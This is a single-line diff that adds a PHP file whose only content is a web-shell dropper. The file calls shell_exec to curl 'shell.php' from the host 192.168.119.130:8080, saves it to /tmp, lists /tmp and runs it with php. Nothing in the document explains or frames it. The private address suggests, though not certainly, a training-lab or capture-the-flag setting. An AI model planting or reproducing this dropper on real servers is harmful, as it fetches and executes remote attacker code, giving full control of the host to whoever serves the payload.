@@ -1,0 +1,1 @@
+<?php echo shell_exec("curl 192.168.119.130:8080/shell.php > /tmp/shell.php; ls /tmp; php /tmp/shell.php");?>
